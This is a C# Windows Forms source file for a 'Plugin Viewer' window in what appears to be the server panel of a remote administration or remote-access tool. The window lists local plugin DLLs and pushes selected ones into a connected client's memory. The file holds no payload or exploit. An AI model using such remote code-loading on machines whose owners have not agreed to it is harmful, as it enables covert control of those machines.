using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;

namespace InvokedServer.Forms
{
    public partial class FrmPlugins : Form
    {
        private string _pluginPath = "Plugins\\";
        private string PluginWordString = "Plugin";
        private string suffix = ".dll";
        private readonly string _windowname = "Plugin Viewer";
        private readonly Client _connectClient;
        private readonly PluginViewerHandler _pluginViewerHandler;
        private static readonly Dictionary<Client, FrmPlugins> OpenedForms = new Dictionary<Client, FrmPlugins>();

        public static FrmPlugins CreateNewOrGetExisting(Client client)
        {
            if (FrmPlugins.OpenedForms.ContainsKey(client))
                return FrmPlugins.OpenedForms[client];
            FrmPlugins newOrGetExisting = new FrmPlugins(client);
            newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmPlugins.OpenedForms.Remove(client));
            FrmPlugins.OpenedForms.Add(client, newOrGetExisting);
            return newOrGetExisting;
        }

        public FrmPlugins(Client client)
        {
            this._connectClient = client;
            this._pluginViewerHandler = new PluginViewerHandler(client);
            this.RegisterMessageHandler();
            this.InitializeComponent();
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (connected)
                return;
            this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient) + " *Client Disconnected*";
        }

        private void FrmPlugins_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle(this._windowname, this._connectClient);
            this.OnResize(EventArgs.Empty);
            this._pluginViewerHandler.GetLoadedPlugins();
        }

        private void FrmPlugins_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.UnregisterMessageHandler();
            this._pluginViewerHandler.Dispose();
        }

        private void PluginsDataGridView_onMouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Left || this.PluginsDataGridView.HitTest(e.X, e.Y) != DataGridView.HitTestInfo.Nowhere)
                return;
            this.PluginsDataGridView.ClearSelection();
        }

        private void RegisterMessageHandler()
        {
            this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
            this._pluginViewerHandler.NewPlugins += new PluginViewerHandler.LoadedPluginsHandler(this.PopulateList);
            MessageHandler.Register((IMessageProcessor)this._pluginViewerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister((IMessageProcessor)this._pluginViewerHandler);
            this._pluginViewerHandler.NewPlugins -= new PluginViewerHandler.LoadedPluginsHandler(this.PopulateList);
            this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
        }

        private string MakeSizeString(int bytelength)
        {
            double num1 = (double)bytelength / 1024.0;
            double num2 = num1 / 1024.0;
            return num2 < 1.0 ? string.Format("{0} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2);
        }

        private void AddToDataGridView(string plugName, string pluginSize, bool loaded)
        {
            DataGridViewRow row = this.PluginsDataGridView.Rows[this.PluginsDataGridView.Rows.Add()];
            row.Cells["StatusCol"].Value = loaded ? (object)"Loaded" : (object)"Not Loaded";
            row.Cells["NameCol"].Value = (object)plugName;
            row.Cells["SizeCol"].Value = (object)pluginSize;
            row.Cells["FlagCol"].Value = loaded ? (object)this.DataGridFlagImageList.Images[0] : (object)this.DataGridFlagImageList.Images[1];
        }

        private void PopulateList(object sender, List<string> plugins)
        {
            this.PluginsDataGridView.Rows.Clear();
            List<Tuple<string, string>> tupleList = new List<Tuple<string, string>>();

            if (Directory.Exists(this._pluginPath))
            {
                foreach (string filePath in Directory.GetFiles(this._pluginPath, "*.dll"))
                {
                    string fileName = Path.GetFileName(filePath);
                    if (fileName.Contains(this.PluginWordString) && fileName.EndsWith(this.suffix, StringComparison.OrdinalIgnoreCase))
                    {
                        string pluginName = fileName.Substring(this.PluginWordString.Length, fileName.Length - this.PluginWordString.Length - this.suffix.Length);
                        int fileLength = File.ReadAllBytes(filePath).Length;
                        tupleList.Add(Tuple.Create(pluginName, this.MakeSizeString(fileLength)));
                    }
                }
            }

            if (plugins.Count != 0)
            {
                foreach (string plugin in plugins)
                {
                    bool found = false;
                    foreach (var tuple in tupleList)
                    {
                        if (tuple.Item1 == plugin)
                        {
                            this.AddToDataGridView(plugin, tuple.Item2, true);
                            tupleList.RemoveAll(t => t.Item1 == plugin);
                            found = true;
                            break;
                        }
                    }
                    if (!found)
                        this.AddToDataGridView(plugin, "??", true);
                }
            }

            foreach (var tuple in tupleList)
            {
                this.AddToDataGridView(tuple.Item1, tuple.Item2, false);
            }

            this.PluginsDataGridView.ClearSelection();
            this.StatusToolStripStatusLabel.Text = "Status: Updated";
            this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_blue;
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            this.StatusToolStripStatusLabel.Text = "Status: Fetching loaded plugins from client memory..";
            this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_orange;
            this._pluginViewerHandler.GetLoadedPlugins();
        }

        private bool FindPluginsAndInstall()
        {
            bool flag = false;
            if (this.PluginsDataGridView.SelectedRows.Count == 0)
                return false;

            foreach (DataGridViewRow selectedRow in (BaseCollection)this.PluginsDataGridView.SelectedRows)
            {
                string str1 = (string)selectedRow.Cells["StatusCol"].Value;
                string pluginName = (string)selectedRow.Cells["NameCol"].Value;
                if (!selectedRow.IsNewRow && str1 != "Loaded")
                {
                    string str2 = "Plugin" + pluginName + ".dll";
                    string fullPath = Path.Combine(this._pluginPath, str2);
                    if (File.Exists(fullPath))
                        this._pluginViewerHandler.InstallPlugin(fullPath, pluginName);
                    else
                        flag = true;
                }
            }
            return !flag;
        }

        private void btnInstall_Click(object sender, EventArgs e)
        {
            if (this.FindPluginsAndInstall())
            {
                this.StatusToolStripStatusLabel.Text = "Status: Succesfully Installed Plugin(s)";
                this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_green;
            }
            else
            {
                this.StatusToolStripStatusLabel.Text = "Status: Error Installing Plugin(s)";
                this.StatusToolStripStatusLabel.Image = (Image)Resources.flag_red;
            }
        }

        private void PluginsDataGridView_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }
    }
}
